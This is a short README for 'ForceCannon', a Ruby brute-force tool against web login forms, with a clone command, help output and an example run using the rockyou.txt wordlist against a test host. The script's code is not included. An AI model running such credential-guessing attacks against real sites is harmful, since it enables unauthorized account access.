
# Bruteforce Login Page [ForceCannon]

This is a script made in ruby to attack login forms on web pages by brute force method with wordlists. It tests both the combination of passwords and usernames with the selected wordlist.


```bash
  git clone https://github.com/JoaoPedroMoreira02/BruteForce_Web.git
```

## [Help] Output

```bash
Usage: ./app.rb [-t/--target] [-u/--username] [-P/--Password_list]
    -t, --target TARGET              Target IP address or domain name
    -u, --username USER_VALUE        Username value
    -p, --password PASSWORD_VALUE    Password value
    -U, --Users_list WORDLIST        Wordlist of Usernames
    -P, --Password_list WORDLIST     Wordlist of Passwords
    -e, --error_msg AUTH_ERROR_MSG   Authentication error message to check if the attack was successful
    -h, --help                       show this help message and exit

```

```bash 
./ForceCannon.rb -t http://test-vuln -u admin123 -P rockyou.txt -e The username or password provided is incorrect 
```